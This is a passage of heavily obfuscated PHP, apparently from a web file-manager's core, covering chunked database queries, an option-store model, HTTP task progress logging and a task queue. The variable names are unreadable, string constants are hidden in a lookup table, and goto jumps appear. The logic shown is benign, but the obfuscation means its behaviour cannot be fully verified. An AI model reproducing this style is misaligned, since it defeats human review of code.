false) { $Ÿûó­‡ =& $_SERVER[ò«¥Ê‡å]; ignore_timeout(); $ûÓş‰ƒ = self::SQL_WHERE_IN_CHUNK; if (empty($æğÈè•ü)) { $this->error = think_lang($Ÿûó­‡[317]); return !1; } $Ä¸½íê± = $this->_parseOptions($Ä¸½íê±); foreach ($æğÈè•ü as $¡–ğğªª => $õ«…¾Á…) { $æğÈè•ü[$¡–ğğªª] = $this->_facade($õ«…¾Á…); $this->_beforeInsert($æğÈè•ü[$¡–ğğªª], $Ä¸½íê±); } if (method_exists($this->db, $Ÿûó­‡[318])) { for ($ğã¡ø²º = 0; $ğã¡ø²º < count($æğÈè•ü); $ğã¡ø²º += $ûÓş‰ƒ) { $™îéûÂ = array_slice($æğÈè•ü, $ğã¡ø²º, $ûÓş‰ƒ); if (!is_array($™îéûÂ) || count($™îéûÂ) == 0) { break; } $¿ª° = $this->db->insertAll($™îéûÂ, $Ä¸½íê±, $ßĞè¬Éõ); $this->chunkEventCheck(count($™îéûÂ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($æğÈè•ü as $¡–ğğªª => $õ«…¾Á…) { $¿ª° = $this->db->insert($õ«…¾Á…, $Ä¸½íê±, $ßĞè¬Éõ); } $this->commit(); } if (!1 !== $¿ª°) { $»ÚãØŒí = $this->getLastInsID(); if ($»ÚãØŒí) { return $»ÚãØŒí; } } return $¿ª°; } public function save($ÈøŞÃê‡ = '', $‘š¿Ëø“ = array()) { $ÔÄª±¡ =& $_SERVER[ò«¥Ê‡å]; $´õ¢ú = self::SQL_WHERE_IN_CHUNK; $­ÓÔ·¼İ = $this->optionsValue(); $şçèˆ = $this->findWhereField($­ÓÔ·¼İ); if (!$şçèˆ) { return parent::save($ÈøŞÃê‡, $‘š¿Ëø“); } $öÄ×¼ò‚ = 0; $ß£‘ôëÔ = $­ÓÔ·¼İ[$ÔÄª±¡[321]][$şçèˆ][1]; $ß£‘ôëÔ = is_array($ß£‘ôëÔ) ? $ß£‘ôëÔ : array(); $ï„¹Ğıİ = count($ß£‘ôëÔ); for ($—Šµì•Æ = 0; $—Šµì•Æ < $ï„¹Ğıİ; $—Šµì•Æ += $´õ¢ú) { $â’‘‰ã† = array_slice($ß£‘ôëÔ, $—Šµì•Æ, $´õ¢ú); if (!is_array($â’‘‰ã†) || count($â’‘‰ã†) == 0) { break; } $­ÓÔ·¼İ[$ÔÄª±¡[321]][$şçèˆ][1] = $â’‘‰ã†; $this->optionsValue($­ÓÔ·¼İ); $öÄ×¼ò‚ += parent::save($ÈøŞÃê‡, $‘š¿Ëø“); $this->chunkEventCheck(count($â’‘‰ã†)); } $this->chunkEventSet(); return $öÄ×¼ò‚; } public function add($¾­æ¤ìÚ = '', $ãóÚËÑ× = array(), $ñ•š®ÈÎ = false) { if ($this->addTaskStatus && is_array($¾­æ¤ìÚ)) { $this->addTaskData[] = $¾­æ¤ìÚ; return; } return parent::add($¾­æ¤ìÚ, $ãóÚËÑ×, $ñ•š®ÈÎ); } public function parseWhereLike($ë“ƒûê™, $Ê €úòÏ = '', $²ŸøÏ¶ = false, &$İµ®‹Åô = false) { $­üâ¡¹ =& $_SERVER[ò«¥Ê‡å]; $ƒçûóÎë = $GLOBALS[$­üâ¡¹[6]][$­üâ¡¹[427]]; if (!$ƒçûóÎë[$­üâ¡¹[428]]) { return $ë“ƒûê™; } if (!is_array($ë“ƒûê™)) { return $ë“ƒûê™; } $ï°ÍÉŸ = array(); $ú¨«… = 0; foreach ($ë“ƒûê™ as $àëœ—Ëó => $éÇ¹µËÎ) { if (is_array($éÇ¹µËÎ) && count($éÇ¹µËÎ) == 2 && $éÇ¹µËÎ[0] == $­üâ¡¹[429] && is_string($éÇ¹µËÎ[1]) && substr($éÇ¹µËÎ[1], 0, 1) == $­üâ¡¹[430] && substr($éÇ¹µËÎ[1], strlen($éÇ¹µËÎ[1]) - 1, 1) == $­üâ¡¹[430]) { $İµ®‹Åô = !0; $öã¾ÌŞù = is_string($àëœ—Ëó) ? $àëœ—Ëó : $Ê €úòÏ; $Œ…°½à« = substr($éÇ¹µËÎ[1], 1, strlen($éÇ¹µËÎ[1]) - 2); $Œ…°½à« = $this->db->escapeString($Œ…°½à«); if (!strpos($öã¾ÌŞù, $­üâ¡¹[10])) { $öã¾ÌŞù = $­üâ¡¹[431] . $öã¾ÌŞù . $­üâ¡¹[431]; } $ÁÆıË–ğ = $­üâ¡¹[205] . $Œ…°½à« . $­üâ¡¹[205]; $Œ…°½à« = str_replace(array($­üâ¡¹[10], $­üâ¡¹[432], $­üâ¡¹[11]), $­üâ¡¹[433], $Œ…°½à«); if ($ƒçûóÎë[$­üâ¡¹[434]]) { $ÁÆıË–ğ = $­üâ¡¹[435] . $Œ…°½à« . $­üâ¡¹[436]; if ($ƒçûóÎë[$­üâ¡¹[437]]) { $ÁÆıË–ğ = $­üâ¡¹[436] . $Œ…°½à« . $­üâ¡¹[435]; } } $ï°ÍÉŸ[$ú¨«…] = $­üâ¡¹[438] . $öã¾ÌŞù . $­üâ¡¹[439] . $ÁÆıË–ğ . $­üâ¡¹[440]; $ú¨«…++; continue; } if (is_array($éÇ¹µËÎ)) { $Ê €úòÏ = is_string($àëœ—Ëó) ? $àëœ—Ëó : $Ê €úòÏ; $éÇ¹µËÎ = $this->parseWhereLike($éÇ¹µËÎ, $Ê €úòÏ, !0, $İµ®‹Åô); } if (is_numeric($àëœ—Ëó)) { $ï°ÍÉŸ[$ú¨«…] = $éÇ¹µËÎ; $ú¨«…++; } else { $ï°ÍÉŸ[$àëœ—Ëó] = $éÇ¹µËÎ; } } if ($İµ®‹Åô && !$²ŸøÏ¶) { } return $ï°ÍÉŸ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($í®ÉÔß¡ = array()) { $Ï¡ãÙ›ñ =& $_SERVER[ò«¥Ê‡å]; $Ñ±»Õı = self::SQL_WHERE_IN_CHUNK; $–•ûŞ­Í = $this->optionsValue(); $¼¯ˆà = $this->findWhereField($–•ûŞ­Í); if (!$¼¯ˆà || isset($–•ûŞ­Í[$Ï¡ãÙ›ñ[338]]) || isset($–•ûŞ­Í[$Ï¡ãÙ›ñ[399]])) { return parent::select($í®ÉÔß¡); } $ï¯¼õı± = $–•ûŞ­Í[$Ï¡ãÙ›ñ[321]][$¼¯ˆà][1]; $ï¯¼õı± = is_array($ï¯¼õı±) ? $ï¯¼õı± : array(); $ğÎúÈ›Â = null; for ($áã‘¸’õ = 0; $áã‘¸’õ < count($ï¯¼õı±); $áã‘¸’õ += $Ñ±»Õı) { $äâ´¡ÅÜ = array_slice($ï¯¼õı±, $áã‘¸’õ, $Ñ±»Õı); if (!is_array($äâ´¡ÅÜ) || count($äâ´¡ÅÜ) == 0) { break; } $–•ûŞ­Í[$Ï¡ãÙ›ñ[321]][$¼¯ˆà][1] = $äâ´¡ÅÜ; $this->optionsValue($–•ûŞ­Í); $¢¹–ÁÈî = parent::select($í®ÉÔß¡); if (!$¢¹–ÁÈî) { continue; } $ğÎúÈ›Â = is_array($ğÎúÈ›Â) ? $ğÎúÈ›Â : array(); $ğÎúÈ›Â = array_merge($ğÎúÈ›Â, $¢¹–ÁÈî); } return $ğÎúÈ›Â; } public function delete($¹®Å–ë› = array()) { $¬ğ¢Ê”¢ =& $_SERVER[ò«¥Ê‡å]; $…àÒ«Û = self::SQL_WHERE_IN_CHUNK; $×şÂÄ–¯ = $this->optionsValue(); $Æ„½Ü± = $this->findWhereField($×şÂÄ–¯); if (!$Æ„½Ü±) { return parent::delete($¹®Å–ë›); } $öˆ¡Ê¾ù = 0; $–ÒğşË© = $×şÂÄ–¯[$¬ğ¢Ê”¢[321]][$Æ„½Ü±][1]; $–ÒğşË© = is_array($–ÒğşË©) ? $–ÒğşË© : array(); for ($ Î¹­ŞŒ = 0; $ Î¹­ŞŒ < count($–ÒğşË©); $ Î¹­ŞŒ += $…àÒ«Û) { $‚İ¬–“¿ = array_slice($–ÒğşË©, $ Î¹­ŞŒ, $…àÒ«Û); if (!is_array($‚İ¬–“¿) || count($‚İ¬–“¿) == 0) { break; } $×şÂÄ–¯[$¬ğ¢Ê”¢[321]][$Æ„½Ü±][1] = $‚İ¬–“¿; $this->optionsValue($×şÂÄ–¯); $öˆ¡Ê¾ù += parent::delete($¹®Å–ë›); } return $öˆ¡Ê¾ù; } private function findWhereField($Øß´ÆÃ) { $»Ïì£ş =& $_SERVER[ò«¥Ê‡å]; $å­áî½  = self::SQL_WHERE_IN_CHUNK; if (!is_array($Øß´ÆÃ) || !is_array($Øß´ÆÃ[$»Ïì£ş[321]])) { return !1; } foreach ($Øß´ÆÃ[$»Ïì£ş[321]] as $«Óù…¿æ => $Œ“¨úü) { if (is_array($Œ“¨úü) && isset($Œ“¨úü[0]) && is_string($Œ“¨úü[0]) && strtolower($Œ“¨úü[0]) == $»Ïì£ş[7] && is_array($Œ“¨úü[1]) && count($Œ“¨úü[1]) > $å­áî½ ) { ignore_timeout(); return $«Óù…¿æ; } } return !1; } public function setMasterDB($º¡ô–Ê© = true) { think_config($_SERVER[ò«¥Ê‡å][441], $º¡ô–Ê©); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\x65\x6d\x4f\160\164\151\157\x6e"; public $field = array(); public function listData($œ¸¯Å» = false, $˜»Âè’¬ = "\155\x6f\144\x69\146\x79\x54\151\x6d\x65", $â™ğ’‹Í = false) { $„±‡ºËø = Model($this->modelType)->get(!1, $this->optionType, !0); $ÖÈ·¾õ = array_values($„±‡ºËø); if ($ÖÈ·¾õ && $ÖÈ·¾õ[0] && !is_array($ÖÈ·¾õ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $„±‡ºËø = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$„±‡ºËø) { return $œ¸¯Å» ? null : array(); } if (!$œ¸¯Å») { $„±‡ºËø = array_filter(array_values($„±‡ºËø)); return array_sort_by($„±‡ºËø, $˜»Âè’¬, $â™ğ’‹Í); } return $„±‡ºËø[$_SERVER[ò«¥Ê‡å][442] . $œ¸¯Å»]; } public function insert($Òşš¤¹) { $ê¶ºáŸ¤ =& $_SERVER[ò«¥Ê‡å]; $Òşš¤¹ = array_field_key($Òşš¤¹, $this->field); $¦°àÄ² = Model($this->modelType)->get($ê¶ºáŸ¤[443], $this->optionType . $ê¶ºáŸ¤[444]); $¦°àÄ² = $¦°àÄ² ? $¦°àÄ² : 0; $Òşš¤¹[$ê¶ºáŸ¤[445]] = ++$¦°àÄ²; $Òşš¤¹[$ê¶ºáŸ¤[217]] = time(); $Òşš¤¹[$ê¶ºáŸ¤[87]] = time(); Model($this->modelType)->set($ê¶ºáŸ¤[443], $¦°àÄ², $this->optionType . $ê¶ºáŸ¤[444]); Model($this->modelType)->set($ê¶ºáŸ¤[442] . $¦°àÄ², $Òşš¤¹, $this->optionType); return $¦°àÄ²; } public function update($À¾§¼Ü, $¨•÷áÅ÷) { $§µ¾ù =& $_SERVER[ò«¥Ê‡å]; $¨•÷áÅ÷ = array_field_key($¨•÷áÅ÷, $this->field); $§ĞÖ†¤ = $this->listData($À¾§¼Ü); if (!$§ĞÖ†¤ || !$À¾§¼Ü) { return !1; } $¨•÷áÅ÷ = array_merge($§ĞÖ†¤, $¨•÷áÅ÷); $¨•÷áÅ÷[$§µ¾ù[87]] = time(); return Model($this->modelType)->set($§µ¾ù[442] . $À¾§¼Ü, $¨•÷áÅ÷, $this->optionType); } public function remove($ìØŠ™¤) { if (!$ìØŠ™¤) { return !1; } return Model($this->modelType)->remove($_SERVER[ò«¥Ê‡å][442] . $ìØŠ™¤, $this->optionType); } public function clear() { $Ó—ÙÓš‹ =& $_SERVER[ò«¥Ê‡å]; Model($this->modelType)->remove($Ó—ÙÓš‹[443], $this->optionType . $Ó—ÙÓš‹[444]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ë·õãşƒ, $Ÿæ›Ò’) { if (!$Ÿæ›Ò’) { return !1; } $ºÏÖØ¶Í = $this->listData(); $ºÏÖØ¶Í = array_to_keyvalue($ºÏÖØ¶Í, $ë·õãşƒ); return isset($ºÏÖØ¶Í[$Ÿæ›Ò’]) ? $ºÏÖØ¶Í[$Ÿæ›Ò’] : !1; } public function findByName($ç¿ÔÓÈì) { return $this->findByKey($_SERVER[ò«¥Ê‡å][32], $ç¿ÔÓÈì); } protected function resetData($´áãéº) { $¤ ê¹†˜ =& $_SERVER[ò«¥Ê‡å]; $´áãéº = is_array($´áãéº) ? $´áãéº : array(); $ƒß¤½ûå = array(); for ($¦˜„÷¶ = 0; $¦˜„÷¶ < count($´áãéº); $¦˜„÷¶++) { $ƒß¤½ûå[$¤ ê¹†˜[442] . $´áãéº[$¦˜„÷¶][$¤ ê¹†˜[445]]] = $´áãéº[$¦˜„÷¶]; } return Model($this->modelType)->set($ƒß¤½ûå, !1, $this->optionType); } private function getAutoName($Ñòı’¢‘) { $ò”•Ğ×» = array_to_keyvalue($this->listData(), $_SERVER[ò«¥Ê‡å][32]); if (!$ò”•Ğ×» || !isset($ò”•Ğ×»[$Ñòı’¢‘])) { return $Ñòı’¢‘; } for ($§Öïıüª = 1; $§Öïıüª < count($ò”•Ğ×»); $§Öïıüª++) { $ÃÈÂ¹Ş = $Ñòı’¢‘ . "\x28{$§Öïıüª}\51"; if (!isset($ò”•Ğ×»[$ÃÈÂ¹Ş])) { return $ÃÈÂ¹Ş; } } return $ÃÈÂ¹Ş; } } goto c´È’¹Ù–¬; fˆ¹…¯æ: class TaskHttp extends Task { protected function startAfter() { $ñÑÂÕ“Â =& $_SERVER[ò«¥Ê‡å]; $¿†Ü‹åç =& $this->task; $¿†Ü‹åç[$ñÑÂÕ“Â[1778]] = 1; Hook::bind($ñÑÂÕ“Â[1746], array($this, $ñÑÂÕ“Â[1779])); Hook::bind($ñÑÂÕ“Â[1748], array($this, $ñÑÂÕ“Â[1780])); Hook::bind($ñÑÂÕ“Â[1750], array($this, $ñÑÂÕ“Â[1781])); } protected function endAfter() { $Öâµ¹× =& $_SERVER[ò«¥Ê‡å]; Hook::unbind($Öâµ¹×[1746], array($this, $Öâµ¹×[1779])); Hook::unbind($Öâµ¹×[1748], array($this, $Öâµ¹×[1780])); Hook::unbind($Öâµ¹×[1750], array($this, $Öâµ¹×[1781])); } public function progressStart($­ô§) { $æ€«ŞŸ£ =& $_SERVER[ò«¥Ê‡å]; $ßä©ºàÏ = curl_getinfo($­ô§); self::log($æ€«ŞŸ£[1782] . $ßä©ºàÏ[$æ€«ŞŸ£[353]]); self::valueSet($this->task[$æ€«ŞŸ£[445]], $this->task); } public function progressEnd($©¾ßšæº) { $æÇŸŞ©Ó =& $_SERVER[ò«¥Ê‡å]; self::log($æÇŸŞ©Ó[1783] . $this->task[$æÇŸŞ©Ó[445]]); $this->end(); } public function progress($¬Ùå€Ì¨, $Ñü‚ÉÛ‘, $½­÷¯Ï§, $Ëí¨·§, $ç²¯¢µü) { $§¤³æÆ© =& $_SERVER[ò«¥Ê‡å]; $†Ê‘ı×© =& $this->task; if ($ç²¯¢µü > 0) { $†Ê‘ı×©[$§¤³æÆ©[825]] = $†Ê‘ı×©[$§¤³æÆ©[825]] == 0 ? $Ëí¨·§ : $†Ê‘ı×©[$§¤³æÆ©[825]]; $†Ê‘ı×©[$§¤³æÆ©[1702]] = $ç²¯¢µü; } else { if ($½­÷¯Ï§ > 0) { $†Ê‘ı×©[$§¤³æÆ©[825]] = $†Ê‘ı×©[$§¤³æÆ©[825]] == 0 ? $Ñü‚ÉÛ‘ : $†Ê‘ı×©[$§¤³æÆ©[825]]; $†Ê‘ı×©[$§¤³æÆ©[1702]] = $½­÷¯Ï§; } } $this->update(); self::log("\160\x72\x6f\x67\162\145\x73\x73\110\164\x74\160\x3a\144\x6f\x77\156\72{$½­÷¯Ï§}\x2f{$Ñü‚ÉÛ‘}\x3b\40\x75\x70\x6c\157\141\144\72{$ç²¯¢µü}\x2f{$Ëí¨·§}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($‰÷»ÎÂ’, $í×Ú«…î = '', $ä¤µ—Ş’ = 0, $Ô«‚€ğñ = '') { $İÁõù½À =& $_SERVER[ò«¥Ê‡å]; $Ô«‚€ğñ = $Ô«‚€ğñ ? $Ô«‚€ğñ : ($í×Ú«…î ? $í×Ú«…î : $‰÷»ÎÂ’); $üüÒîæò = new Task($‰÷»ÎÂ’, $í×Ú«…î, $ä¤µ—Ş’, $Ô«‚€ğñ); $GLOBALS[$İÁõù½À[1784] . $‰÷»ÎÂ’] = new TaskLog($İÁõù½À[1685], $üüÒîæò, $Ô«‚€ğñ); return $üüÒîæò; } public function __construct($û“ı£Ô = '', $Šš³àâÙ = '', $šÖÆ±ü— = '') { $à”ØíæÚ =& $_SERVER[ò«¥Ê‡å]; if (!$û“ı£Ô) { $û“ı£Ô = $à”ØíæÚ[1685]; } $êšÒ¨åŸ = $û“ı£Ô . $à”ØíæÚ[432] . rand_string(10); if (!$šÖÆ±ü—) { $šÖÆ±ü— = $û“ı£Ô . $à”ØíæÚ[53] . $šÖÆ±ü—; } switch ($û“ı£Ô) { case $à”ØíæÚ[1685]: if (!$Šš³àâÙ || !$Šš³àâÙ->task) { return echoLog($û“ı£Ô . $à”ØíæÚ[1785]); } $ªóâÑÉ = $Šš³àâÙ; $êšÒ¨åŸ = $ªóâÑÉ->task[$à”ØíæÚ[445]]; $û“ı£Ô = $ªóâÑÉ->task[$à”ØíæÚ[445]]; if (!$ªóâÑÉ->task[$à”ØíæÚ[1591]]) { $ªóâÑÉ->task[$à”ØíæÚ[1591]] = $šÖÆ±ü— ? $šÖÆ±ü— : $û“ı£Ô; } break; case $à”ØíæÚ[1786]: if (!$Šš³àâÙ) { return echoLog($û“ı£Ô . $à”ØíæÚ[1787]); } $âë­€ß¢ = is_string($Šš³àâÙ) ? array($Šš³àâÙ) : $Šš³àâÙ; $ªóâÑÉ = new TaskFileTransfer($êšÒ¨åŸ, $û“ı£Ô, 0, $šÖÆ±ü— ? $šÖÆ±ü— : $âë­€ß¢[0]); foreach ($âë­€ß¢ as $×•©¬Ø·) { $ªóâÑÉ->addPath($×•©¬Ø·); } break; case $à”ØíæÚ[359]: if (!$Šš³àâÙ) { return echoLog($û“ı£Ô . $à”ØíæÚ[1787]); } $âë­€ß¢ = is_string($Šš³àâÙ) ? array($Šš³àâÙ) : $Šš³àâÙ; $ªóâÑÉ = new TaskZip($êšÒ¨åŸ, $û“ı£Ô, 0, $šÖÆ±ü— ? $šÖÆ±ü— : $âë­€ß¢[0]); foreach ($âë­€ß¢ as $×•©¬Ø·) { $ªóâÑÉ->addPath($×•©¬Ø·); } break; case $à”ØíæÚ[1261]: if (!$Šš³àâÙ) { return echoLog($û“ı£Ô . $à”ØíæÚ[1787]); } $ªóâÑÉ = new TaskUnZip($êšÒ¨åŸ, $û“ı£Ô, 0, $šÖÆ±ü— ? $šÖÆ±ü— : $Šš³àâÙ); if ($Šš³àâÙ) { $ªóâÑÉ->addFile($Šš³àâÙ); } break; case $à”ØíæÚ[151]: $ªóâÑÉ = new TaskHttp($êšÒ¨åŸ, $û“ı£Ô); break; default: return; break; } $this->task = $ªóâÑÉ; $this->taskID = $êšÒ¨åŸ; Hook::bind($à”ØíæÚ[1722], array($this, $à”ØíæÚ[1788])); Hook::bind($à”ØíæÚ[1724], array($this, $à”ØíæÚ[1789])); Hook::bind($à”ØíæÚ[1718], array($this, $à”ØíæÚ[1790])); echoLog($à”ØíæÚ[1791] . $ªóâÑÉ->task[$à”ØíæÚ[1591]]); } public function __destruct() { $this->end(); } public function end($¹ıƒ­Áˆ = '') { $˜şÇãò =& $_SERVER[ò«¥Ê‡å]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¹ıƒ­Áˆ); $this->task = !1; $this->taskID = !1; Hook::unbind($˜şÇãò[1722], array($this, $˜şÇãò[1788])); Hook::unbind($˜şÇãò[1724], array($this, $˜şÇãò[1789])); Hook::unbind($˜şÇãò[1718], array($this, $˜şÇãò[1790])); } public function taskUpdate($•ö¬ù¡‰) { $ĞÅê÷Û• =& $_SERVER[ò«¥Ê‡å]; if (!$•ö¬ù¡‰ || $this->taskID != $•ö¬ù¡‰[$ĞÅê÷Û•[445]]) { return; } $â¡‰¤°Ş = 20; $œµ˜¡®™ = intval($•ö¬ù¡‰[$ĞÅê÷Û•[1703]] * $â¡‰¤°Ş); $¨’ûŒ³Û = $ĞÅê÷Û•[165] . str_repeat($ĞÅê÷Û•[931], $œµ˜¡®™) . $ĞÅê÷Û•[1061] . str_repeat($ĞÅê÷Û•[53], $â¡‰¤°Ş - $œµ˜¡®™) . $ĞÅê÷Û•[167]; $·Ô¹Â®å = $¨’ûŒ³Û . sprintf($ĞÅê÷Û•[1792], $•ö¬ù¡‰[$ĞÅê÷Û•[1703]] * 100) . $ĞÅê÷Û•[1793]; $†õÕ”ëù = $·Ô¹Â®å . $•ö¬ù¡‰[$ĞÅê÷Û•[1702]] . $ĞÅê÷Û•[8] . $•ö¬ù¡‰[$ĞÅê÷Û•[825]] . LNG($ĞÅê÷Û•[1794]); $¢µ„ó¸û = $ĞÅê÷Û•[12]; if ($•ö¬ù¡‰[$ĞÅê÷Û•[1778]]) { $†õÕ”ëù = $·Ô¹Â®å . size_format($•ö¬ù¡‰[$ĞÅê÷Û•[1702]]) . $ĞÅê÷Û•[8] . size_format($•ö¬ù¡‰[$ĞÅê÷Û•[825]]); $¢µ„ó¸û = size_format($•ö¬ù¡‰[$ĞÅê÷Û•[1704]]) . $ĞÅê÷Û•[1795]; } if ($•ö¬ù¡‰[$ĞÅê÷Û•[1111]]) { $•ö¬ù¡‰[$ĞÅê÷Û•[1752]] = $•ö¬ù¡‰[$ĞÅê÷Û•[1111]] . $ĞÅê÷Û•[53] . $•ö¬ù¡‰[$ĞÅê÷Û•[1752]]; } if ($•ö¬ù¡‰[$ĞÅê÷Û•[1752]]) { $€í¤ş§ï = $ĞÅê÷Û•[12]; if ($•ö¬ù¡‰[$ĞÅê÷Û•[1754]]) { $€í¤ş§ï = $ĞÅê÷Û•[50] . size_format($•ö¬ù¡‰[$ĞÅê÷Û•[1755]]) . $ĞÅê÷Û•[8] . size_format($•ö¬ù¡‰[$ĞÅê÷Û•[1754]]); } $¢µ„ó¸û .= $•ö¬ù¡‰[$ĞÅê÷Û•[1752]] . $€í¤ş§ï; } if ($•ö¬ù¡‰[$ĞÅê÷Û•[802]] && !$•ö¬ù¡‰[$ĞÅê÷Û•[1754]]) { $¢µ„ó¸û .= $ĞÅê÷Û•[53] . size_format($•ö¬ù¡‰[$ĞÅê÷Û•[1759]]) . $ĞÅê÷Û•[8] . size_format($•ö¬ù¡‰[$ĞÅê÷Û•[802]]); } echoLog($†õÕ”ëù . $ĞÅê÷Û•[53] . $¢µ„ó¸û, !0); } public function taskEnd($÷ÃÈ¿í) { $Ò½ñ¡»õ =& $_SERVER[ò«¥Ê‡å]; if (!$÷ÃÈ¿í || $this->taskID != $÷ÃÈ¿í[$Ò½ñ¡»õ[445]]) { return; } $˜Ğ”à³å = $÷ÃÈ¿í ? $÷ÃÈ¿í[$Ò½ñ¡»õ[1702]] . $Ò½ñ¡»õ[8] . $÷ÃÈ¿í[$Ò½ñ¡»õ[825]] . LNG($Ò½ñ¡»õ[1794]) . $Ò½ñ¡»õ[73] : $Ò½ñ¡»õ[12]; echoLog($Ò½ñ¡»õ[1796] . $÷ÃÈ¿í[$Ò½ñ¡»õ[1591]] . ($÷ÃÈ¿í[$Ò½ñ¡»õ[496]] ? $Ò½ñ¡»õ[73] . $÷ÃÈ¿í[$Ò½ñ¡»õ[496]] : $Ò½ñ¡»õ[12]) . $Ò½ñ¡»õ[73] . $˜Ğ”à³å . $Ò½ñ¡»õ[1797] . sprintf($Ò½ñ¡»õ[897], timeFloat() - $÷ÃÈ¿í[$Ò½ñ¡»õ[1705]]) . $Ò½ñ¡»õ[1717]); $this->end(); } public function taskKill($À®Åâ“ë) { $’Î¶¼í¬ =& $_SERVER[ò«¥Ê‡å]; if (!$À®Åâ“ë || $this->taskID != $À®Åâ“ë[$’Î¶¼í¬[445]]) { return; } echoLog($’Î¶¼í¬[1798] . $À®Åâ“ë[$’Î¶¼í¬[1591]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\x51\x75\145\x75\145\114\145\156\147\164\150"; const QUEUE_DATA = "\164\x61\x73\x6b\121\x75\145\x75\x65\104\141\x74\x61"; const QUEUE_TIME = "\164\141\x73\x6b\121\165\x65\x75\x65\x4c\141\163\x74\x52\x75\x6e"; const QUEUE_THREAD = "\164\x61\x73\153\121\165\x65\165\x65\124\150\162\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($–½œ¥ˆ, $ª¹”·Ë = array(), $”›û®„ = '', $ú¢Í«í = '') { $ÈàûÆ¢Â =& $_SERVER[ò«¥Ê‡å]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ú¢Í«í && array_find_by_field(self::$listData, $ÈàûÆ¢Â[96], $ú¢Í«í)) { return !0; } if ($ú¢Í«í && array_find_by_field(self::$listDataAdd, $ÈàûÆ¢Â[96], $ú¢Í«í)) { return !0; } self::$listDataAdd[] = array($ÈàûÆ¢Â[310] => $–½œ¥ˆ, $ÈàûÆ¢Â[1799] => $ª¹”·Ë, $ÈàûÆ¢Â[496] => $”›û®„, $ÈàûÆ¢Â[96] => $ú¢Í«í); return !0; } public static function addSubmit() { $ÈúÜÍÖ =& $_SERVER[ò«¥Ê‡å]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ÈúÜÍÖ[1800] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ÈúÜÍÖ[12], $ÈúÜÍÖ[496])), $ÈúÜÍÖ[187]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ù‚†§À , $“ÓƒÊıÚ = array(), $Éîäö = '', $îØìİ÷Ÿ = '') { $Ñ‘œŞ½‘ =& $_SERVER[ò«¥Ê‡å]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Øğ€èÂ = self::getAll(); if ($îØìİ÷Ÿ && array_find_by_field($Øğ€èÂ, $Ñ‘œŞ½‘[96], $îØìİ÷Ÿ)) { return !0; } $Øğ€èÂ[] = array($Ñ‘œŞ½‘[310] => $Ù‚†§À , $Ñ‘œŞ½‘[1799] => $“ÓƒÊıÚ, $Ñ‘œŞ½‘[496] => $Éîäö, $Ñ‘œŞ½‘[96] => $îØìİ÷Ÿ); self::setAll($Øğ€èÂ); write_log($Ñ‘œŞ½‘[1800] . $Éîäö, $Ñ‘œŞ½‘[187]); return !0; } public static function run() { $¡¾é¤ê¹ =& $_SERVER[ò«¥Ê‡å]; $Èöù–‚ = self::getAll(); $¬€¡Í‹ = array_shift($Èöù–‚); if (!$¬€¡Í‹) { return !1; } self::setAll($Èöù–‚); $½‚´› = timeFloat(); $š¿²¹Ã = $¡¾é¤ê¹[12]; try { $š¿²¹Ã = Hook::apply($¬€¡Í‹[$¡¾é¤ê¹[310]], $¬€¡Í‹[$¡¾é¤ê¹[1799]]); } catch (Exception $‹¯–İ‰†) { write_log($‹¯–İ‰†, $¡¾é¤ê¹[1229]); } $ö¯…¥Ä‚ = number_format(timeFloat() - $½‚´›, 3) . $¡¾é¤ê¹[1717]; if ($š¿²¹Ã && is_string($š¿²¹Ã)) { $ö¯…¥Ä‚ = $ö¯…¥Ä‚ . $¡¾é¤ê¹[1801] . $š¿²¹Ã; } write_log($¡¾é¤ê¹[1802] . $¬€¡Í‹[$¡¾é¤ê¹[496]] . $¡¾é¤ê¹[1803] . $ö¯…¥Ä‚, $¡¾é¤ê¹[187]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $áßÉ×”í =& $_SERVER[ò«¥Ê‡å]; $ÊÃ†ˆ³¹ = self::threadCount() + 1; if ($ÊÃ†ˆ³¹ > 3 || !self::count()) { return; } write_log($áßÉ×”í[1804] . $ÊÃ†ˆ³¹, $áßÉ×”í[187]); Cache::set(self::QUEUE_THREAD, $ÊÃ†ˆ³¹, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($áßÉ×”í[1805], $áßÉ×”í[187]); } public static function getKey($¤“í¦, $‘ò³Ù = "\x69\156\x74") { $ÈÉäÆç =& $_SERVER[ò«¥Ê‡å]; Cache::removeMemory($¤“í¦); $Î²¬ïê® = Cache::get($¤“í¦); if ($‘ò³Ù == $ÈÉäÆç[334]) { return $Î²¬ïê® ? intval($Î²¬ïê®) : 0; } if ($‘ò³Ù == $ÈÉäÆç[1806]) { return is_array($Î²¬ïê®) ? $Î²¬ïê® : array(); } return $Î²¬ïê®; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ò«¥Ê‡å][1806]); } public static function setAll($‰ïŞ–ÙÉ) { $ îï›É‚ = 3600 * 24 * 30; 